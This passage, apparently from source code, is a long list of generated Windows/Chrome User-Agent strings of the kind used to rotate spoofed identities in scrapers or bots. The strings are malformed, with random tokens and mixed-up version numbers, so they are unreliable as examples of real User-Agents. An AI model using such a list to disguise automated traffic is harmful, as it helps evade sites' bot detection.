Win64; x64)K326E) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4726.150 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V406R) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4801.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q994V) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4850.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N839R) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4363.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)M748L) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4211.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E223K) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4655.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A545R) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4245.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T852I) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4847.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y81Z) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4211.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)I974Y) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4875.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J519A) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4847.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F448H) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4455.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A359N) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4554.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M612P) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4389.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E600A) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4399.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y690D) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4855.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N299D) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4441.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R126Q) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4262.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G832L) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4548.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q308D) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4716.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D439L) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4418.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L793Q) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4706.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L532K) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4582.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O964Q) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4260.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I438E) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4866.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V295O) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4499.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K553M) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4249.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)D121I) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4401.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Q798S) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4558.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A861T) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4503.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D145A) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4530.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T28W) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4465.150 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E690E) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4305.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H315T) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4354.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q902G) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4378.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K152G) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4217.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)G194N) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4879.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V466R) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4264.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D586Y) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4400.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V335U) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4489.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H415Z) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4857.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y266F) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4686.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L134C) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4286.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P224L) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4430.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M888C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4860.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A778E) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4580.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)R354Q) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4419.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V767C) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4863.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W166R) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4812.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L378D) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4682.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O132G) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4237.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E369E) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4594.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P474J) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4478.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X394L) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4873.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D72L) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4267.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C321Y) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4599.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)O80A) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4698.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y560O) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4428.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E421G) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4562.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M738G) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4616.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y948U) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4865.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C877P) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4825.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W945W) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4629.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)R338A) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4512.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P75D) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4662.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Z230G) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4537.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A835N) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4797.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F508D) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4517.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B622F) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4481.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P589A) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4840.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H129B) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4884.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q43X) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4796.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L465C) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4267.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J701S) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4821.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K176A) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4553.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y675O) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4396.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C288W) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4410.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N179I) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4698.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B137T) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4519.150 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q84N) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4628.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N7T) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4613.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C590A) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4732.117 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K773E) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4505.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H177S) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4330.50 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)T740N) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4666.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E438R) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4694.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O200D) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4507.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)H767R) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4793.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B722B) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4213.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O692L) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4271.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O787G) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4272.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G520N) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4421.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V87C) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4306.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N146J) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4477.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E770B) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4429.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)M481Z) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4651.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C270J) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4254.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G134J) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4278.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B847P) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4465.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E83N) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4527.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T173O) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4634.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N352S) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4755.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L644E) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4476.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q58B) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4576.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C558Q) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4347.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G332U) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4378.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I851P) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4613.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z477Q) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4863.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M151Y) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4658.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C599U) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4638.59 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A178W) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4399.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P241A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4823.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N642X) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4415.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K986U) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4316.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y228Y) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4491.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H934U) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4731.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A210X) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4523.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)O719G) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4466.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A713D) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4530.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I225N) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4817.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A710B) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4586.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J704V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4236.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A935C) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4435.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L113X) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4839.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y52Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4856.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H631D) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4344.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)P511I) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4706.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)P593P) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4418.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B580K) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4481.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q535C) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4328.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A545R) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4686.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A628M) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4379.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z852C) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4710.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X3O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4554.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)P562H) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4504.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V497P) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4296.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A324Y) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4662.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H561A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4624.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B131P) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4230.102 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U988Q) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4675.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G143N) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4677.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M741U) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4551.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C7W) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4537.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C843X) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4432.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O135E) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4677.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J144G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4231.59 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q348A) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4750.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U452K) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4740.145 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q735T) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4718.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Z587Z) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4349.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D993U) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4303.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H347V) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4786.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G127K) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4608.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E820D) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4383.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R901M) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4625.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L49B) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4721.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X816J) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4801.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A139W) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4850.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H230Y) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4786.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y792M) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4762.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K20D) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4544.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V195O) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4863.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F989I) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4268.128 Chrome/105.0.0.0 